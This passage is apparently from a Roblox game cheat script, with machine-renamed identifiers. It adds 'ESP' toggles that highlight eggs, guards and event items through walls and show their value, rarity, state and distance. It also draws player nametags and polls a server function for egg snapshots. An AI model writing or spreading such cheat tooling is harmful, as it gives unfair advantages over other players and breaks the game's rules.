			local function func481(param245, param246)
				if param245.State == "Claimed" then
					return false
				end

				if num115.MinRarity > 0 and param246.Number < num115.MinRarity then
					return false
				end
				local flag508 = num115.MinValue > 0

				if flag508 then
					local minValue = num115.MinValue
					flag508 = func479(param245, param246) < minValue
				end

				if flag508 then
					return false
				end
				return true
			end

			local function func482(part23, param247, player4)
				local model, isBasePart

				if typeof(param247.Model) == "Instance" then
					model = param247.Model
					local hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, isBasePart = func473(param247.Uid)
				end

				local bottomCFrame = param247.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = isBasePart or workspace.Terrain

					if part23.Anchor ~= terrain or part23.CFrame ~= bottomCFrame then
						part23.Anchor = terrain
						part23.CFrame = bottomCFrame
						part23.Billboard.Adornee = terrain
						part23.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (isBasePart and isBasePart.Position.Y - bottomCFrame.Position.Y or 1) + n13, 0)
					end
				end

				local info = num115.Info
				local baseMutation = param247.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local n21 = tonumber(param247.AssetScale) or 1
				local showIcon = info.Icon == true and player4.Icon ~= nil

				if showIcon and part23.Icon.Image ~= tostring(player4.Icon) then
					part23.Icon.Image = tostring(player4.Icon)
				end

				local showName = info.Name == true

				if showName then
					flag2.SetRow(part23.NameRow, player4.DisplayName, tbl317)
				end

				local showRarity = info.Rarity == true and player4.Name ~= ""

				if showRarity then
					local rarityPalette = player4.RarityPalette
					flag2.SetRow(part23.RarityRow, string.upper(player4.Name), rarityPalette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					flag2.SetRow(part23.MutationRow, string.upper(func7(baseMutation)), tbl325[baseMutation] or value413)
				end

				local showValue = info.Value == true

				if showValue then
					flag2.SetRow(part23.ValueRow, "$" .. func474(func479(param247, player4)) .. "/s", value412)
				end

				local tbl352 = {}
				local eggRecords = tbl1.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, param247.AssetCategory, n21)

					if ok and tonumber(result) then
						table.insert(tbl352, func474(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(tbl352, string.format("x%.2f", n21))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, param247)

					if ok and tonumber(result) then
						table.insert(tbl352, "$" .. func474(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						table.insert(tbl352, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and param247.AreaId ~= nil then
					table.insert(tbl352, tostring(param247.AreaId))
				end

				if info.State and param247.State ~= nil and param247.State ~= "Slot" then
					table.insert(tbl352, tostring(param247.State))
				end

				local showExtra = #tbl352 > 0

				if showExtra then
					flag2.SetRow(part23.ExtraRow, table.concat(tbl352, "  |  "), flag2.Palettes.Sheen)
				end

				if part23.ShowIcon ~= showIcon or part23.ShowName ~= showName or part23.ShowRarity ~= showRarity or part23.ShowMutation ~= showMutation or part23.ShowValue ~= showValue or part23.ShowExtra ~= showExtra then
					part23.ShowIcon = showIcon
					part23.ShowName = showName
					part23.ShowRarity = showRarity
					part23.ShowMutation = showMutation
					part23.ShowValue = showValue
					part23.ShowExtra = showExtra
					func476(part23)
				end

				local highlight2 = num115.Highlight == tbl5[3]
				local flag509

				if highlight2 then
					flag509 = highlight2
				else
					flag509 = num115.Highlight == tbl5[2] and player4.Number >= num115.HighlightMin
				end

				if flag509 and model then
					if not part23.Highlight and n20 < n then
						local highlight = Instance.new("Highlight")
						highlight.Name = func3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = player4.Color
						highlight.OutlineColor = player4.Palette.Outline
						highlight.Parent = flag504
						part23.Highlight = highlight
						n20 += 1
					end

					if part23.Highlight and part23.Highlight.Adornee ~= model then
						part23.Highlight.Adornee = model
					end
				else
					func478(part23)
				end
			end

			local function func483(param248)
				func478(param248)
				param248.Billboard:Destroy()
			end

			local function func484()
				local value422 = tbl344
				local obj81 = flag504
				tbl344 = {}
				flag504 = nil
				n20 = 0

				task.spawn(function()
					local now = os.clock()

					for _, value423 in pairs(value422) do
						if value423.Highlight then
							value423.Highlight:Destroy()
						end

						value423.Billboard:Destroy()

						if n16 < os.clock() - now then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if obj81 then
						obj81:Destroy()
					end
				end)
			end

			local function func485(list56, flag510, flag511)
				local function func486()
					return flag510 == n19 and flag511 == n18 and flag502
				end

				func468()
				local tbl353 = {}
				local now = os.clock()

				for _, value424 in pairs(list56) do
					local uid = type(value424) == "table" and value424.Uid

					if type(uid) == "string" and type(value424.AssetCategory) == "string" then
						local assetCategory15 = func467(value424.AssetCategory)

						if num115.Eggs and func481(value424, assetCategory15) then
							tbl353[uid] = true
							local entry23 = tbl344[uid]

							if not entry23 then
								local result90 = func477()
								tbl344[uid] = result90
								entry23 = result90
							end

							func482(entry23, value424, assetCategory15)
						end
					end

					if os.clock() - now > n16 then
						RunService.Heartbeat:Wait()
						now = os.clock()
						if not func486() then
							return
						end
					end
				end

				if num115.Eggs and num115.OwnBase then
					for _, item129 in ipairs(func480()) do
						local assetCategory16 = func467(item129.AssetCategory)

						if func481(item129, assetCategory16) then
							tbl353[item129.Uid] = true
							local entry24 = tbl344[item129.Uid]

							if not entry24 then
								entry24 = func477()
								tbl344[item129.Uid] = entry24
							end

							func482(entry24, item129, assetCategory16)
						end
					end
				end

				for k, value425 in pairs(tbl344) do
					if not tbl353[k] then
						tbl344[k] = nil
						func483(value425)
					end
				end

				return true
			end

			local flag512 = false
			local flag513 = false

			func470 = function()
				if not flag502 or not flag501 then
					return
				end
				flag512 = true
				if flag513 then
					return
				end
				flag513 = true

				task.defer(function()
					while flag502 and flag501 and flag512 do
						flag512 = false
						n19 += 1
						local ok, result = pcall(func485, flag501, n19, n18)

						if ok and result ~= true then
							flag512 = true
						end

						RunService.Heartbeat:Wait()
					end

					flag513 = false
				end)
			end

			local function func487()
				local flag514 = n18

				if flag501 and next(tbl344) == nil then
					func470()
				end

				local eggState = tbl1.EggState
				local flag515 = type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function"
				local records = nil

				if flag515 then
					local ok, result = pcall(eggState.ReadFieldEggs)
					ok = ok and type(result) == "table" and type(result.Records) == "table"
					records = nil

					if ok then
						records = result.Records
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= n17 then
					n17 = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if flag514 ~= n18 or not flag502 then
					return
				end

				if records ~= nil then
					local tbl354 = {}

					for k, record in pairs(records) do
						tbl354[k] = record
					end

					flag501 = tbl354
				end

				if flag501 then
					func470()
				end
			end

			local function func488()
				task.spawn(pcall, func487)
			end

			local function func489()
				if flag503 then
					return
				end
				flag503 = true

				task.delay(0.5, function()
					flag503 = false

					if flag502 then
						func488()
					end
				end)
			end

			func471 = function()
				for _, value426 in pairs(tbl344) do
					func469(value426)
				end
			end

			local function func490()
				flag502 = false
				n18 += 1
				n19 += 1
				flag2.DisconnectAll(tbl345)
				func484()
			end

			local function func491()
				if flag502 then
					func488()
					return
				end
				flag502 = true
				local flag516 = n18
				local eggState = tbl1.EggState

				if type(eggState) == "table" then
					for _, item130 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local entry25 = eggState[item130]

						if type(entry25) == "table" and type(entry25.Connect) == "function" then
							local ok, result = pcall(entry25.Connect, entry25, func489)

							if ok and result then
								table.insert(tbl345, result)
							end
						end
					end
				end

				for _, item131 in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local value427 = workspace:FindFirstChild(item131)

					if value427 then
						table.insert(tbl345, value427.ChildAdded:Connect(func489))
						table.insert(tbl345, value427.ChildRemoved:Connect(func489))
					end
				end

				task.spawn(function()
					while flag516 == n18 do
						task.wait(10)
						if flag516 == n18 then
							func489()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while flag516 == n18 do
						task.wait(1)

						if flag516 == n18 then
							if num115.Info.Distance then
								func470()
							end

							continue
						end

						break
					end
				end)

				func488()
			end

			local function func492()
				if num115.Eggs then
					func491()
				else
					func490()
				end
			end

			tbl348 = { Eggs = nil }
			local tbl355 = { Eggs = false }
			local flag517 = false

			local function func493()
				if flag517 then
					return
				end
				local flag518 = flag2.ReadToggle(tbl348.Eggs, tbl355.Eggs)
				if flag518 == num115.Eggs and flag502 == flag518 then
					return
				end
				num115.Eggs = flag518
				func492()
			end

			func4(function()
				flag517 = true
				num115.Eggs = false
				func490()
			end)

			func472 = function(list57)
				local tbl356 = {}

				if type(list57) == "table" then
					for k, value428 in pairs(list57) do
						k = value428 == true and type(k) == "string" and k or type(value428) == "string" and value428
						local value429 = k or nil

						if value429 then
							tbl356[value429] = true
						end
					end
				end

				return tbl356
			end

			tbl348.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(value)
					tbl355.Eggs = value == true
					flag2.SyncSoon(func493)
				end,
			})
		end

		espSection:CreateToggle({
			Name = "ESP Fixed Size",
			Default = false,
			SubOf = tbl348.Eggs,
			Callback = function(value)
				local fixedSize = value == true

				if num115.FixedSize ~= fixedSize then
					num115.FixedSize = fixedSize
					func471()
				end
			end,
		})

		espSection:CreateToggle({
			Name = "ESP Own Base Eggs",
			Note = "Also show the eggs placed in your own base",
			Default = true,
			SubOf = tbl348.Eggs,
			Callback = function(value)
				num115.OwnBase = value ~= false
				func470()
			end,
		})

		do
			local tbl357 = { "Any" }
			local tbl358 = { Any = 0 }
			local tbl359 = {}
			local tbl360 = {}
			local tbl361 = { "Any Mutation", "No Mutation" }
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl362 = {}
			local tbl363 = {}

			if type(directory) == "table" then
				for k, value430 in pairs(directory) do
					local rarity = type(value430) == "table" and value430.Rarity or nil
					local flag519 = type(rarity) == "table"

					if flag519 then
						flag519 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag519 = flag519 or nil

					if flag519 then
						local str40 = tostring(rarity.DisplayName or rarity._id or flag519)
						tbl362[flag519] = tbl362[flag519] or str40

						table.insert(tbl363, {
							Category = tostring(k),
							Name = tostring(value430.DisplayName or k),
							Rarity = flag519,
							RarityName = str40,
						})
					end
				end
			end

			local tbl364 = {}

			for k in pairs(tbl362) do
				table.insert(tbl364, k)
			end

			table.sort(tbl364)

			for _, item132 in ipairs(tbl364) do
				local formatted16 = string.format("%d - %s", item132, tbl362[item132])
				table.insert(tbl357, formatted16)
				tbl358[formatted16] = item132
			end

			table.sort(tbl363, function(param249, param250)
				if param249.Rarity ~= param250.Rarity then
					return param249.Rarity > param250.Rarity
				end
				return param249.Name < param250.Name
			end)

			for _, item133 in ipairs(tbl363) do
				local formatted17 = string.format("%s [%s]", item133.Name, item133.RarityName)

				if tbl360[formatted17] then
					formatted17 = string.format("%s [%s] (%s)", item133.Name, item133.RarityName, item133.Category)
				end

				table.insert(tbl359, formatted17)
				tbl360[formatted17] = item133.Category
			end

			local tbl365 = {}
			local mutations = tbl1.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl365, tostring(k))
				end
			end

			table.sort(tbl365)

			for _, item134 in ipairs(tbl365) do
				table.insert(tbl361, item134)
			end

			local function func494(param251)
				for _, item135 in ipairs(tbl357) do
					if tbl358[item135] == param251 then
						return item135
					end
				end

				return tbl357[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = tbl357,
				Default = func494(5),
				SubOf = tbl348.Eggs,
				Callback = function(value)
					num115.MinRarity = tbl358[type(value) == "table" and value[1] or value] or 0
					func470()
				end,
			})
		end

		func6(espSection:CreateMultiDropdown({
			Name = "ESP Show Info",
			Options = tbl3,
			Default = tbl4,
			SubOf = tbl348.Eggs,
			Callback = function(value)
				num115.Info = func472(value)
				func470()
			end,
		}))

		do
			local tbl366 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n21 = 0
			local str41 = "M/s"

			local function func495(flag520, flag521)
				if flag520 ~= nil then
					n21 = math.max(0, math.floor(tonumber(flag520) or n21))
				end

				if flag521 ~= nil then
					str41 = tostring(flag521)
				end

				num115.MinValue = n21 * (tbl366[str41] or tbl366["M/s"]).Mult
				func470()
			end

			func5(espSection, {
				Name = "Min ESP Value",
				SubOf = tbl348.Eggs,
				Legacy = "ESP Min Value",
				SectionName = "ESP",
				OnRaw = function(num118)
					func495(math.floor(num118 / 1000), "K/s")
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = tbl348.Eggs,
			Callback = function(value)
				local num119 = tonumber(value)

				if num119 and num115.SizeScale ~= num119 / 100 then
					num115.SizeScale = num119 / 100
					func471()
				end
			end,
		})

		local n21

		do
			local n22 = 1
			n21 = 0.75

			local tbl367 = {
				Sleeping = flag2.Palettes.Accent,
				Waking = flag2.Palettes.Gold,
				Chasing = flag2.Palettes.Red,
			}

			local orange = flag2.Palettes.Orange
			local tbl368 = {}
			local tbl369 = {}
			local flag522 = false
			local value431 = nil

			local function func496(obj82)
				local attribute = obj82:GetAttribute("GuardState")
				if attribute == "Sleeping" then
					return "Sleeping"
				end

				if attribute == "Waking" then
					return "Waking Up"
				end

				if attribute == "Chasing" then
					local attribute2 = obj82:GetAttribute("TargetPlayer")
					if attribute2 == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local playerByUserId = tonumber(attribute2) and Players:GetPlayerByUserId(tonumber(attribute2))
					return playerByUserId and "Chasing " .. playerByUserId.DisplayName or "Chasing"
				end

				return attribute and tostring(attribute) or "Awake"
			end

			local function func497(param252, obj83)
				local value432 = tbl367[obj83:GetAttribute("GuardState")] or orange
				param252.Highlight.FillColor = value432.Outline
				param252.Highlight.OutlineColor = value432.Outline
				flag2.SetRow(param252.StateRow, func496(obj83), value432)
			end

			local function func498(param253)
				local floor = math.floor
				param253.Tag.Size = UDim2.fromOffset(flag2.ScaledWidth(115, n21), floor(flag2.RowHeight(n21) * 1.6))
			end

			local function func499(param254)
				local entry26 = tbl368[param254]
				if not entry26 then
					return
				end
				tbl368[param254] = nil
				flag2.DisconnectAll(entry26.Connections)
				entry26.Highlight:Destroy()
				entry26.Tag:Destroy()
			end

			local function func500(param255, adornee)
				if tbl368[adornee] then
					return
				end
				local num120 = flag2.FindGuardRoot(adornee)
				if not num120 then
					return
				end

				if not value431 or not value431.Parent then
					value431 = flag2.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = func3()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = value431
				local ok, result, result2 = pcall(adornee.GetBoundingBox, adornee)
				local flag523 = ok and typeof(result) == "CFrame"
				local n23 = 6

				if flag523 then
					n23 = result.Position.Y + result2.Y * 0.5 - num120.Position.Y + n22
				end

				local value433, value434 = flag2.CreateTag(value431, math.huge)
				value433.Adornee = num120
				value433.StudsOffsetWorldSpace = Vector3.new(0, n23, 0)
				local value435 = flag2.CreateTextRow(value434, flag2.StatusFont, 1, 0.45)
				local value436 = flag2.CreateTextRow(value434, flag2.StatusFont, 2, 0.55)
				local sheen = flag2.Palettes.Sheen
				flag2.SetRow(value435, tostring(param255) .. " Guard", sheen)
				local tbl370 = { Highlight = highlight, Tag = value433, StateRow = value436, Connections = {} }
				tbl368[adornee] = tbl370
				func498(tbl370)
				func497(tbl370, adornee)

				local function func501()
					func497(tbl370, adornee)
				end

				table.insert(tbl370.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(func501))
				table.insert(tbl370.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(func501))

				table.insert(tbl370.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						func499(adornee)
					end
				end))
			end

			local function func502()
				flag522 = false
				flag2.DisconnectAll(tbl369)

				for k in pairs(tbl368) do
					func499(k)
				end

				if value431 then
					value431:Destroy()
					value431 = nil
				end
			end

			local function func503()
				if flag522 then
					return
				end
				flag522 = true
				tbl369 = flag2.WatchGuards(func500)
			end

			local value437 = nil
			local flag524 = false
			local flag525 = false

			local function func504()
				if flag525 then
					return
				end

				if flag2.ReadToggle(value437, flag524) then
					func503()
				elseif flag522 then
					func502()
				end
			end

			func4(function()
				flag525 = true
				func502()
			end)

			value437 = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(value)
					flag524 = value == true
					flag2.SyncSoon(func504)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = value437,
				Callback = function(value)
					local num121 = tonumber(value)

					if num121 and n21 ~= num121 / 100 then
						n21 = num121 / 100

						for _, value438 in pairs(tbl368) do
							func498(value438)
						end
					end
				end,
			})
		end

		do
			local tbl371 = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local paletteFromCol2 = flag2.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accent = flag2.Palettes.Accent
			local value439 = nil
			local tbl372 = {}
			local flag526 = false
			local connection = nil
			local value440 = nil
			local flag527 = false
			local flag528 = false

			local function func505(param256)
				local entry27 = tbl372[param256]
				if not entry27 then
					return
				end
				tbl372[param256] = nil

				pcall(function()
					entry27.Highlight:Destroy()
					entry27.Tag:Destroy()
				end)
			end

			local function func506()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, item136 in ipairs(tbl371) do
					local obj84 = drScrambleEvent and drScrambleEvent:FindFirstChild(item136.Id)
					local hitbox = obj84 and (obj84:FindFirstChild("Hitbox", true) or obj84.PrimaryPart or obj84:FindFirstChildWhichIsA("BasePart", true))
					local entry28 = tbl372[item136.Id]

					if entry28 and (entry28.Model ~= obj84 or not hitbox) then
						func505(item136.Id)
						entry28 = nil
					end

					if hitbox and not entry28 then
						if not value439 or not value439.Parent then
							value439 = flag2.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = func3()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = obj84
						highlight.Parent = value439
						local value441, value442 = flag2.CreateTag(value439, 25000)
						value441.Adornee = hitbox
						value441.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						value441.Size = UDim2.fromOffset(flag2.ScaledWidth(160), floor(flag2.RowHeight() * 1.6))
						local value443 = flag2.CreateTextRow(value442, flag2.StatusFont, 1, 0.5)
						local value444 = flag2.CreateTextRow(value442, flag2.StatusFont, 2, 0.5)
						flag2.SetRow(value443, item136.Label, flag2.Palettes.Sheen)
						entry28 = { Model = obj84, Hitbox = hitbox, Highlight = highlight, Tag = value441, InfoRow = value444 }
						tbl372[item136.Id] = entry28
					end

					if entry28 then
						local scrambleLostPart = type(str1.ScrambleLostPart) == "function" and str1.ScrambleLostPart(item136.Id) == true
						local value445 = scrambleLostPart and accent or paletteFromCol2
						flag2.SetRow(entry28.InfoRow, scrambleLostPart and "Collected" or string.format("%d studs", math.floor(str1.DistanceTo(entry28.Hitbox.Position))), value445)
						entry28.Highlight.FillColor = value445.Outline
						entry28.Highlight.OutlineColor = value445.Outline
					end
				end
			end

			local function func507()
				flag526 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				for k in pairs(tbl372) do
					func505(k)
				end

				if value439 then
					value439:Destroy()
					value439 = nil
				end
			end

			local function func508()
				if flag526 then
					return
				end
				flag526 = true
				local n22 = 1

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n22 += deltaTime

					if n22 >= 0.3 then
						n22 = 0
						pcall(func506)
					end
				end)
			end

			local function func509()
				if flag528 then
					return
				end

				if flag2.ReadToggle(value440, flag527) then
					func508()
				elseif flag526 then
					func507()
				end
			end

			func4(function()
				flag528 = true
				func507()
			end)

			value440 = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(value)
					flag527 = value == true
					flag2.SyncSoon(func509)
				end,
			})
		end

		local TextService
		TextService = game:GetService("TextService")
		local font
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		local value446

		do
			local colorSequence = ColorSequence.new
			local value447 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local value448 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			local tbl373 = { value447, value448 }

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, tbl373)
			end

			value446 = colorSequence(tbl373)
		end

		local colorSequence

		colorSequence = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
		})

		local flag529
		flag529 = false
		local n22
		n22 = 0
		local obj85
		obj85 = nil
		local tbl374
		tbl374 = {}
		local tbl375
		tbl375 = {}
		local tbl376
		tbl376 = {}
		local n23, tbl377, value449, flag530, flag531

		do
			local tbl378 = {}
			n23 = 0.75
			tbl377 = { Name = true, Username = false, Avatar = false, Tool = true }
			value449 = nil
			flag530 = false
			flag531 = false

			local function func510(flag532)
				local str42 = tostring(flag532 or "")
				if str42:match("^%d+$") then
					return "rbxassetid://" .. str42
				end
				return str42
			end

			local function func511(instance25)
				if not instance25 or not instance25:IsA("Tool") then
					return ""
				end
				local textureId = func510(instance25.TextureId)
				if textureId ~= "" then
					return textureId
				end

				for _, item137 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = instance25:GetAttribute(item137)
					if type(attribute) == "string" and func510(attribute) ~= "" then
						return func510(attribute)
					end
				end

				for _, descendant in ipairs(instance25:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						textureId = func510(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						textureId = func510(descendant.Image)
					end

					if textureId ~= "" then
						return textureId
					end
				end

				return ""
			end

			local function func512()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n23))
			end

			local function func513(text, size)
				local str43 = text .. "@" .. size
				local entry29 = tbl378[str43]
				if entry29 then
					return entry29
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X
				local n24

				if ok then
					n24 = ok
				else
					n24 = (utf8.len(text) or #text) * size * 0.56
				end

				tbl378[str43] = n24
				return n24
			end

			local function func514(param257, color3, flag533, param258)
				param257.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				param257.Color = color3
				param257.LineJoinMode = Enum.LineJoinMode.Round
				param257.Transparency = 0

				param257.Thickness = pcall(function()
					param257.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and flag533 or param258
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = func3()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = func3()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = func3()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function func515(param259)
				local result91 = func512()
				local visible = tbl377.Name == true or tbl377.Username == true
				local visible2 = tbl377.Avatar == true
				local visible3 = tbl377.Tool == true and param259.ToolIcon.Image ~= ""
				local n24 = visible2 and math.floor(result91 * 0.72) or 0
				local n25 = visible3 and math.floor(result91 * 0.82) or 0
				local n26 = math.floor(result91 * 0.7)
				local n27 = math.max(1, math.floor(result91 * 0.04))
				local name = tbl377.Username == true and param259.Player.Name or param259.Player.DisplayName
				param259.Name.Text = name
				param259.Shadow.Text = name
				local n28 = visible and math.floor(math.clamp(func513(name, n26) + 4, n26, 230)) or 0
				local n29 = 0
				local n30 = 0

				if visible2 then
					n29 = 0 + n24
				end

				local n31 = 0

				if visible then
					if not (n29 > 0) then
						n31 = n29
					else
						n31 = n29 + n27
					end

					n29 = n31 + n28
				end

				local n32 = 0
				local n33

				if visible3 then
					if n29 > 0 then
						n29 += n27
					end

					n32 = n29
					n33 = n29 + n25
				else
					n33 = n29
				end

				local n34 = math.max(n33, 1)
				local n35 = 1 / n34
				local n36 = 1 / result91
				param259.Billboard.Size = UDim2.fromOffset(n34, result91)
				param259.Avatar.Visible = visible2
				param259.Name.Visible = visible
				param259.Shadow.Visible = visible
				param259.ToolIcon.Visible = visible3
				param259.ToolShadow.Visible = visible3
				param259.Avatar.Position = UDim2.fromScale(n30 / n34, 0.5)
				param259.Avatar.Size = UDim2.fromScale(n24 / n34, n24 / result91)
				param259.Name.Position = UDim2.fromScale(n31 / n34, 0.5)
				param259.Name.Size = UDim2.fromScale(n28 / n34, n26 / result91)
				param259.Shadow.Position = UDim2.fromScale(n31 / n34 + n35, 0.5 + n36)
				param259.Shadow.Size = param259.Name.Size
				param259.ToolIcon.Position = UDim2.fromScale(n32 / n34, 0.5)
				param259.ToolIcon.Size = UDim2.fromScale(n25 / n34, n25 / result91)
				param259.ToolShadow.Position = UDim2.fromScale(n32 / n34 + n35, 0.5 + n36)
				param259.ToolShadow.Size = param259.ToolIcon.Size
			end

			local function func516(param260, adornee, part24, flag534)
				local highlight = Instance.new("Highlight")
				highlight.Name = func3()
				highlight.Adornee = adornee
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = obj85
				local num122 = flag534 or part24
				local n24 = 3.1

				if num122 ~= part24 then
					n24 = math.clamp(part24.Position.Y - num122.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = func3()
				billboardGui.Adornee = num122
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n24, 0)
				billboardGui.Parent = obj85
				local frame = Instance.new("Frame")
				frame.Name = func3()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local imageLabel2 = createImageLabel(frame, 2)
				imageLabel2.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = func3()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = imageLabel2
				local textLabel8 = createTextLabel(frame, 1)
				textLabel8.TextColor3 = Color3.fromRGB(7, 19, 34)
				textLabel8.TextTransparency = 0.05
				local textLabel9 = createTextLabel(frame, 2)
				textLabel9.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = func3()
				func514(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = textLabel9
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = func3()
				uiGradient.Color = colorSequence
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Name = func3()
				uiGradient2.Color = value446
				uiGradient2.Rotation = 90
				uiGradient2.Parent = textLabel9
				local imageLabel3 = createImageLabel(frame, 1)
